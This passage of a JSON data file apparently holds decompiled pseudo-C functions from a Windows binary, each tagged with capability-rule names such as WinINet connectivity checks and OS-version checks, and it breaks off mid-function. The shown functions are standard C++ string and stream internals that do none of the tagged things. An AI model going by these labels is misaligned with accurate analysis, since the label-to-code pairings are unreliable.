        "token_count": 221
    },
    "1400a31b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400a31b0(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    int64_t arg2_00;\n    int64_t *piVar2;\n    uint64_t uVar3;\n    \n    arg2_00 = arg1[1];\n    piVar2 = *arg1;\n    uVar1 = arg2_00 + arg3;\n    if (piVar2 == arg1 + 2) {\n        uVar3 = 0xf;\n    }\n    else {\n        uVar3 = arg1[2];\n    }\n    if (uVar3 < uVar1) {\n        fcn.1400a3380(arg1, arg2_00, 0, arg2);\n        piVar2 = *arg1;\n    }\n    else if (arg3 != 0) {\n        if (arg3 == 1) {\n            *(piVar2 + arg2_00) = *arg2;\n            piVar2 = *arg1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy();\n            piVar2 = *arg1;\n        }\n    }\n    arg1[1] = uVar1;\n    *(piVar2 + uVar1) = 0;\n    return arg1;\n}\n",
        "token_count": 290
    },
    "1400a324": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a3240(ulong *arg1, ulong *arg2)\n\n{\n    uint64_t uVar1;\n    uchar *puVar2;\n    uint64_t arg3;\n    uint64_t uStack48;\n    \n    if (arg1 == arg2) {\n        return;\n    }\n    puVar2 = *arg1;\n    uVar1 = arg2[1];\n    if (arg1 + 2 == puVar2) {\n        arg3 = 0xf;\n    }\n    else {\n        arg3 = arg1[2];\n    }\n    if (arg3 < uVar1) {\n        uStack48 = uVar1;\n        puVar2 = fcn.1400a3300(arg1, &uStack48, arg3);\n        if (arg1 + 2 != *arg1) {\n            fcn.1400b64d0();\n        }\n        *arg1 = puVar2;\n        arg1[2] = uStack48;\n    }\n    else if (uVar1 == 0) goto code_r0x0001400a3273;\n    if (uVar1 == 1) {\n        *puVar2 = **arg2;\n        puVar2 = *arg1;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar2, *arg2, uVar1);\n        puVar2 = *arg1;\n    }\ncode_r0x0001400a3273:\n    arg1[1] = uVar1;\n    puVar2[uVar1] = 0;\n    return;\n}\n",
        "token_count": 345
    },
    "1400a338": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a3380(ulong *arg1, int64_t arg2, int64_t arg3, uchar *arg4)\n\n{\n    uchar *puVar1;\n    ulong *puVar2;\n    uchar *puVar3;\n    ulong arg3_00;\n    int64_t iVar4;\n    int64_t in_stack_00000028;\n    int64_t aiStack80 [2];\n    \n    aiStack80[0] = (in_stack_00000028 - arg3) + arg1[1];\n    iVar4 = arg1[1] - (arg2 + arg3);\n    if (arg1 + 2 == *arg1) {\n        arg3_00 = 0xf;\n    }\n    else {\n        arg3_00 = arg1[2];\n    }\n    puVar3 = fcn.1400a3300(arg1, aiStack80, arg3_00);\n    if (arg2 != 0) {\n        if (arg2 == 1) {\n            *puVar3 = **arg1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3, *arg1, arg2);\n        }\n    }\n    if ((arg4 != NULL) && (in_stack_00000028 != 0)) {\n        if (in_stack_00000028 == 1) {\n            puVar3[arg2] = *arg4;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3 + arg2, arg4, in_stack_00000028);\n        }\n    }\n    puVar2 = *arg1;\n    if (iVar4 != 0) {\n        puVar1 = puVar2 + arg2 + arg3;\n        if (iVar4 == 1) {\n            puVar3[arg2 + in_stack_00000028] = *puVar1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3 + arg2 + in_stack_00000028, puVar1, iVar4);\n        }\n    }\n    if (arg1 + 2 != puVar2) {\n        fcn.1400b64d0(puVar2);\n    }\n    *arg1 = puVar3;\n    arg1[2] = aiStack80[0];\n    return;\n}\n",
        "token_count": 498
    },
    "1400a46d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong * fcn.1400a46d0(ulong *arg1, int64_t arg2, uint64_t arg3, ulong *arg4)\n\n{\n    ushort *puVar1;\n    ulong *puVar2;\n    char *pcVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    bool bVar8;\n    uint64_t in_stack_00000028;\n    \n    iVar5 = arg1[1];\n    if ((arg3 + 0x1fffffffffffffff) - iVar5 < in_stack_00000028) {\n        pcVar3 = \"basic_string::_M_replace\";\n        fcn.1400b7170(\"basic_string::_M_replace\");\n        puVar2 = 0x7fffffff;\n        uVar4 = pcVar3 - arg2;\n        if ((uVar4 < 0x80000000) && (puVar2 = 0x80000000,  -0x80000001 < uVar4)) {\n            puVar2 = uVar4 & 0xffffffff;\n        }\n        return puVar2;\n    }\n    puVar2 = *arg1;\n    uVar4 = iVar5 + (in_stack_00000028 - arg3);\n    if (puVar2 == arg1 + 2) {\n        uVar6 = 7;\n    }\n    else {\n        uVar6 = arg1[2];\n    }\n    if (uVar6 < uVar4) {\n        fcn.1400a6e10(arg1, arg2, arg3, arg4);\n    }\n    else {\n        puVar1 = puVar2 + arg2 * 2;\n        iVar7 = iVar5 - (arg2 + arg3);\n        bVar8 = iVar7 != 0;\n        if ((arg4 < puVar2) || (puVar2 + iVar5 * 2 < arg4)) {\n            if ((arg3 != in_stack_00000028) && (bVar8)) {\n                if (iVar7 == 1) {\n                    puVar1[in_stack_00000028] = puVar1[arg3];\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar1 + in_stack_00000028, puVar1 + arg3, iVar7 * 2);\n                }\n            }\n            if (in_stack_00000028 == 0) goto code_r0x0001400a4789;\n            if (in_stack_00000028 != 1) {\n                sub.msvcrt.dll_memcpy(puVar1, arg4, in_stack_00000028 * 2);\n                puVar2 = *arg1;\n                goto code_r0x0001400a478c;\n            }\ncode_r0x0001400a48b8:\n            *puVar1 = *arg4;\n            puVar2 = *arg1;\n            goto code_r0x0001400a478c;\n        }\n        if (in_stack_00000028 - 1 < arg3) {\n            if (in_stack_00000028 != 1) {\n                sub.msvcrt.dll_memmove(puVar1, arg4, in_stack_00000028 * 2);\n                goto code_r0x0001400a47eb;\n            }\n            *puVar1 = *arg4;\n            if ((arg3 == 1) || (!bVar8)) goto code_r0x0001400a478c;\ncode_r0x0001400a47f5:\n            if (iVar7 == 1) {\n                puVar1[in_stack_00000028] = puVar1[arg3];\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar1 + in_stack_00000028, puVar1 + arg3, iVar7 * 2);\n            }\n        }\n        else {\ncode_r0x0001400a47eb:\n            if ((arg3 != in_stack_00000028) && (bVar8)) goto code_r0x0001400a47f5;\n        }\n        if (arg3 < in_stack_00000028) {\n            iVar5 = in_stack_00000028 * 2;\n            puVar2 = puVar1 + arg3;\n            if (arg4 + iVar5 <= puVar2) {\n                if (in_stack_00000028 != 1) {\n                    sub.msvcrt.dll_memmove(puVar1, arg4, iVar5);\n                    puVar2 = *arg1;\n                    goto code_r0x0001400a478c;\n                }\n                goto code_r0x0001400a48b8;\n            }\n            if (puVar2 <= arg4) {\n                if (in_stack_00000028 == 1) {\n                    *puVar1 = puVar1[(arg4 - puVar1 >> 1) + (in_stack_00000028 - arg3)];\n                    puVar2 = *arg1;\n                }\n                else {\n                    sub.msvcrt.dll_memcpy(puVar1, puVar1 + (arg4 - puVar1 >> 1) + (in_stack_00000028 - arg3), iVar5);\n                    puVar2 = *arg1;\n                }\n                goto code_r0x0001400a478c;\n            }\n            iVar5 = puVar2 - arg4;\n            if (iVar5 == 2) {\n                *puVar1 = *arg4;\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar1, arg4, iVar5);\n            }\n            iVar7 = in_stack_00000028 - (iVar5 >> 1);\n            if (iVar7 == 1) {\n                *(puVar1 + iVar5) = puVar1[in_stack_00000028];\n                puVar2 = *arg1;\n                goto code_r0x0001400a478c;\n            }\n            if (iVar7 != 0) {\n                sub.msvcrt.dll_memcpy(puVar1 + iVar5, puVar1 + in_stack_00000028, iVar7 * 2);\n                puVar2 = *arg1;\n                goto code_r0x0001400a478c;\n            }\n        }\n    }\ncode_r0x0001400a4789:\n    puVar2 = *arg1;\ncode_r0x0001400a478c:\n    arg1[1] = uVar4;\n    *(puVar2 + uVar4 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 1418
    },
    "1400a4a5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a4a50(int64_t *arg1, uint64_t arg2, ulong arg3)\n\n{\n    ushort *puVar1;\n    uint64_t uVar2;\n    uint64_t auStackX16 [3];\n    \n    if (arg2 < 8) {\n        puVar1 = *arg1;\n        if (arg2 == 0) goto code_r0x0001400a4a73;\n    }\n    else {\n        auStackX16[0] = arg2;\n        puVar1 = fcn.1400a6d90(arg1, auStackX16, 0);\n        *arg1 = puVar1;\n        arg1[2] = auStackX16[0];\n        arg2 = auStackX16[0];\n        if (auStackX16[0] == 0) goto code_r0x0001400a4a73;\n    }\n    uVar2 = 0;\n    if (arg2 == 1) {\n        *puVar1 = arg3;\n    }\n    else {\n        do {\n            puVar1[uVar2] = arg3;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 != arg2);\n    }\ncode_r0x0001400a4a73:\n    arg1[1] = arg2;\n    puVar1[arg2] = 0;\n    return;\n}\n",
        "token_count": 311
    },
    "1400a4c3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a4c30(ulong *arg1, ushort *arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    ushort *puVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t aiStack64 [2];\n    \n    uVar3 = arg3 - arg2;\n    iVar4 = uVar3 >> 1;\n    aiStack64[0] = iVar4;\n    if (uVar3 < 0xf) {\n        puVar2 = *arg1;\n        uVar5 = uVar3;\n    }\n    else {\n        puVar2 = fcn.1400a6d90(arg1, aiStack64, 0);\n        *arg1 = puVar2;\n        arg1[2] = aiStack64[0];\n        uVar5 = aiStack64[0] * 2;\n    }\n    iVar1 = aiStack64[0];\n    if (iVar4 == 1) {\n        *puVar2 = *arg2;\n    }\n    else if (iVar4 != 0) {\n        sub.msvcrt.dll_memcpy(puVar2, arg2, uVar3);\n        puVar2 = *arg1;\n    }\n    arg1[1] = iVar1;\n    *(puVar2 + uVar5) = 0;\n    return;\n}\n",
        "token_count": 309
    },
    "1400a4ce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a4ce0(ulong *arg1, ushort *arg2, int64_t arg3)\n\n{\n    ushort *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t aiStack48 [2];\n    \n    uVar3 = arg3 - arg2;\n    iVar2 = uVar3 >> 1;\n    aiStack48[0] = iVar2;\n    if (uVar3 < 0xf) {\n        puVar1 = *arg1;\n    }\n    else {\n        puVar1 = fcn.1400a6d90(arg1, aiStack48, 0);\n        *arg1 = puVar1;\n        arg1[2] = aiStack48[0];\n    }\n    if (iVar2 == 1) {\n        *puVar1 = *arg2;\n    }\n    else if (iVar2 != 0) {\n        sub.msvcrt.dll_memcpy(puVar1, arg2, uVar3);\n        puVar1 = *arg1;\n    }\n    arg1[1] = aiStack48[0];\n    puVar1[aiStack48[0]] = 0;\n    return;\n}\n",
        "token_count": 264
    },
    "1400a4d7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a4d70(ulong *arg1, ushort *arg2, int64_t arg3)\n\n{\n    ushort *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t aiStack48 [2];\n    \n    uVar3 = arg3 - arg2;\n    iVar2 = uVar3 >> 1;\n    aiStack48[0] = iVar2;\n    if (uVar3 < 0xf) {\n        puVar1 = *arg1;\n    }\n    else {\n        puVar1 = fcn.1400a6d90(arg1, aiStack48, 0);\n        *arg1 = puVar1;\n        arg1[2] = aiStack48[0];\n    }\n    if (iVar2 == 1) {\n        *puVar1 = *arg2;\n    }\n    else if (iVar2 != 0) {\n        sub.msvcrt.dll_memcpy(puVar1, arg2, uVar3);\n        puVar1 = *arg1;\n    }\n    arg1[1] = aiStack48[0];\n    puVar1[aiStack48[0]] = 0;\n    return;\n}\n",
        "token_count": 264
    },
    "1400a4e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a4e00(ulong *arg1, ushort *arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    ushort *puVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t aiStack64 [2];\n    \n    uVar3 = arg3 - arg2;\n    iVar4 = uVar3 >> 1;\n    aiStack64[0] = iVar4;\n    if (uVar3 < 0xf) {\n        puVar2 = *arg1;\n        uVar5 = uVar3;\n    }\n    else {\n        puVar2 = fcn.1400a6d90(arg1, aiStack64, 0);\n        *arg1 = puVar2;\n        arg1[2] = aiStack64[0];\n        uVar5 = aiStack64[0] * 2;\n    }\n    iVar1 = aiStack64[0];\n    if (iVar4 == 1) {\n        *puVar2 = *arg2;\n    }\n    else if (iVar4 != 0) {\n        sub.msvcrt.dll_memcpy(puVar2, arg2, uVar3);\n        puVar2 = *arg1;\n    }\n    arg1[1] = iVar1;\n    *(puVar2 + uVar5) = 0;\n    return;\n}\n",
        "token_count": 309
    },
    "1400a4eb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a4eb0(ulong *arg1, ushort *arg2, int64_t arg3)\n\n{\n    ushort *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t aiStack48 [2];\n    \n    uVar3 = arg3 - arg2;\n    iVar2 = uVar3 >> 1;\n    aiStack48[0] = iVar2;\n    if (uVar3 < 0xf) {\n        puVar1 = *arg1;\n    }\n    else {\n        puVar1 = fcn.1400a6d90(arg1, aiStack48, 0);\n        *arg1 = puVar1;\n        arg1[2] = aiStack48[0];\n    }\n    if (iVar2 == 1) {\n        *puVar1 = *arg2;\n    }\n    else if (iVar2 != 0) {\n        sub.msvcrt.dll_memcpy(puVar1, arg2, uVar3);\n        puVar1 = *arg1;\n    }\n    arg1[1] = aiStack48[0];\n    puVar1[aiStack48[0]] = 0;\n    return;\n}\n",
        "token_count": 264
    },
    "1400a503": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400a5030(int64_t *arg1, int64_t arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    ushort *puVar1;\n    ushort *puVar2;\n    int64_t *piVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    ushort in_stack_00000028;\n    \n    iVar6 = arg1[1];\n    if ((arg3 + 0x1fffffffffffffff) - iVar6 < arg4) {\n        pcVar5 = \"basic_string::_M_replace_aux\";\n        fcn.1400b7170(\"basic_string::_M_replace_aux\");\n        return pcVar5;\n    }\n    piVar3 = *arg1;\n    uVar7 = (arg4 - arg3) + iVar6;\n    if (piVar3 == arg1 + 2) {\n        uVar4 = 7;\n    }\n    else {\n        uVar4 = arg1[2];\n    }\n    if (uVar4 < uVar7) {\n        fcn.1400a6e10(arg1, arg2, arg3, 0);\n        piVar3 = *arg1;\n    }\n    else {\n        iVar6 = iVar6 - (arg3 + arg2);\n        if ((iVar6 != 0) && (arg3 != arg4)) {\n            puVar1 = piVar3 + arg3 * 2 + arg2 * 2;\n            puVar2 = piVar3 + arg4 * 2 + arg2 * 2;\n            if (iVar6 == 1) {\n                *puVar2 = *puVar1;\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar2, puVar1, iVar6 * 2);\n                piVar3 = *arg1;\n            }\n        }\n    }\n    if (arg4 != 0) {\n        puVar1 = piVar3 + arg2 * 2;\n        uVar4 = 0;\n        if (arg4 == 1) {\n            *puVar1 = in_stack_00000028;\n        }\n        else {\n            do {\n                puVar1[uVar4] = in_stack_00000028;\n                uVar4 = uVar4 + 1;\n            } while (arg4 != uVar4);\n        }\n    }\n    arg1[1] = uVar7;\n    *(piVar3 + uVar7 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 561
    },
    "1400a6bb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a6bb0(int64_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    ushort *puVar1;\n    ushort *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    iVar3 = arg1[1];\n    iVar5 = *arg1;\n    iVar4 = iVar3 - (arg2 + arg3);\n    if ((iVar4 != 0) && (arg3 != 0)) {\n        puVar1 = iVar5 + (arg2 + arg3) * 2;\n        puVar2 = iVar5 + arg2 * 2;\n        if (iVar4 == 1) {\n            *puVar2 = *puVar1;\n        }\n        else {\n            sub.msvcrt.dll_memmove(puVar2, puVar1, iVar4 * 2);\n            iVar3 = arg1[1];\n            iVar5 = *arg1;\n        }\n    }\n    arg1[1] = iVar3 - arg3;\n    *(iVar5 + (iVar3 - arg3) * 2) = 0;\n    return;\n}\n",
        "token_count": 256
    },
    "1400a6c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400a6c40(int64_t *arg1, ushort *arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    ushort *puVar2;\n    int64_t arg2_00;\n    int64_t *piVar3;\n    uint64_t uVar4;\n    \n    arg2_00 = arg1[1];\n    piVar3 = *arg1;\n    uVar1 = arg2_00 + arg3;\n    if (piVar3 == arg1 + 2) {\n        uVar4 = 7;\n    }\n    else {\n        uVar4 = arg1[2];\n    }\n    if (uVar4 < uVar1) {\n        fcn.1400a6e10(arg1, arg2_00, 0, arg2);\n        piVar3 = *arg1;\n    }\n    else if (arg3 != 0) {\n        puVar2 = piVar3 + arg2_00 * 2;\n        if (arg3 == 1) {\n            *puVar2 = *arg2;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar2, arg2, arg3 * 2);\n            piVar3 = *arg1;\n        }\n    }\n    arg1[1] = uVar1;\n    *(piVar3 + uVar1 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 315
    },
    "1400a6cd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a6cd0(ulong *arg1, ulong *arg2)\n\n{\n    uint64_t uVar1;\n    ushort *puVar2;\n    uint64_t arg3;\n    uint64_t auStack64 [2];\n    \n    if (arg1 == arg2) {\n        return;\n    }\n    puVar2 = *arg1;\n    uVar1 = arg2[1];\n    if (arg1 + 2 == puVar2) {\n        arg3 = 7;\n    }\n    else {\n        arg3 = arg1[2];\n    }\n    if (arg3 < uVar1) {\n        auStack64[0] = uVar1;\n        puVar2 = fcn.1400a6d90(arg1, auStack64, arg3);\n        if (arg1 + 2 != *arg1) {\n            fcn.1400b64d0();\n        }\n        *arg1 = puVar2;\n        arg1[2] = auStack64[0];\n    }\n    else if (uVar1 == 0) goto code_r0x0001400a6d09;\n    if (uVar1 == 1) {\n        *puVar2 = **arg2;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar2, *arg2, uVar1 * 2);\n        puVar2 = *arg1;\n    }\ncode_r0x0001400a6d09:\n    arg1[1] = uVar1;\n    puVar2[uVar1] = 0;\n    return;\n}\n",
        "token_count": 348
    },
    "1400a6e1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a6e10(ulong *arg1, int64_t arg2, int64_t arg3, ushort *arg4)\n\n{\n    ushort *puVar1;\n    ulong *puVar2;\n    ushort *puVar3;\n    ulong arg3_00;\n    int64_t iVar4;\n    int64_t in_stack_00000028;\n    int64_t aiStack80 [2];\n    \n    aiStack80[0] = (in_stack_00000028 - arg3) + arg1[1];\n    iVar4 = arg1[1] - (arg2 + arg3);\n    if (arg1 + 2 == *arg1) {\n        arg3_00 = 7;\n    }\n    else {\n        arg3_00 = arg1[2];\n    }\n    puVar3 = fcn.1400a6d90(arg1, aiStack80, arg3_00);\n    if (arg2 != 0) {\n        if (arg2 == 1) {\n            *puVar3 = **arg1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3, *arg1, arg2 * 2);\n        }\n    }\n    if ((arg4 != NULL) && (in_stack_00000028 != 0)) {\n        if (in_stack_00000028 == 1) {\n            puVar3[arg2] = *arg4;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3 + arg2, arg4, in_stack_00000028 * 2);\n        }\n    }\n    puVar2 = *arg1;\n    if (iVar4 != 0) {\n        puVar1 = puVar2 + (arg2 + arg3) * 2;\n        if (iVar4 == 1) {\n            puVar3[arg2 + in_stack_00000028] = *puVar1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3 + arg2 + in_stack_00000028, puVar1, iVar4 * 2);\n        }\n    }\n    if (arg1 + 2 != puVar2) {\n        fcn.1400b64d0(puVar2);\n    }\n    *arg1 = puVar3;\n    arg1[2] = aiStack80[0];\n    return;\n}\n",
        "token_count": 513
    },
    "1400aeae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.1400aeae0(int64_t arg1, int64_t *arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uchar uVar10;\n    int64_t iVar11;\n    int64_t *piVar12;\n    int64_t *piVar13;\n    char *pcVar14;\n    char *pcVar15;\n    uint32_t uVar16;\n    uint64_t uVar17;\n    bool bVar18;\n    uchar auStack88 [8];\n    \n    piVar13 = *(arg1 + 0xe8);\n    *(arg1 + 0xe8) = arg2;\n    *(arg1 + 0x20) = arg2 == NULL;\n    if ((arg2 == NULL & *(arg1 + 0x1c)) == 0) {\n        return piVar13;\n    }\n    pcVar14 = \"basic_ios::clear\";\n    fcn.1400b76e0(\"basic_ios::clear\");\n    if (pcVar14 == arg2) {\n        return pcVar14;\n    }\n    piVar13 = pcVar14 + 0x40;\n    if (*(arg2 + 0x18) < 9) {\ncode_r0x0001400aeb4f:\n        iVar11 = arg2[5];\n    }\n    else {\n        piVar13 = fcn.1400b64f0(*(arg2 + 0x18) << 4);\n        iVar11 = *(arg2 + 0x18) + -1;\n        piVar12 = piVar13;\n        if (iVar11 < 0) goto code_r0x0001400aeb4f;\n        do {\n            *piVar12 = 0;\n            *(piVar12 + 1) = 0;\n            bVar18 = iVar11 != 0;\n            iVar11 = iVar11 + -1;\n            piVar12 = piVar12 + 2;\n        } while (bVar18);\n        iVar11 = arg2[5];\n    }\n    if (iVar11 != 0) {\n        if (**0x140102a70 == 0) {\n            *(iVar11 + 0x14) = *(iVar11 + 0x14) + 1;\n        }\n        else {\n            LOCK();\n            *(iVar11 + 0x14) = *(iVar11 + 0x14) + 1;\n        }\n    }\n    uVar16 = 0;\n    fcn.1400ac890(pcVar14, 0);\n    if (*(pcVar14 + 200) != pcVar14 + 0x40) {\n        if (*(pcVar14 + 200) != NULL) {\n            fcn.1400b64c0();\n        }\n        *(pcVar14 + 200) = 0;\n    }\n    pcVar15 = pcVar14;\n    fcn.1400ac930(pcVar14);\n    iVar2 = *(arg2 + 0x18);\n    *(pcVar14 + 0x28) = iVar11;\n    iVar11 = 0;\n    if (0 < iVar2) {\n        do {\n            iVar5 = arg2[0x19];\n            pcVar15 = *(iVar5 + iVar11);\n            *(piVar13 + iVar11) = pcVar15;\n            uVar16 = *(iVar5 + 8 + iVar11);\n            *(piVar13 + iVar11 + 8) = uVar16;\n            iVar11 = iVar11 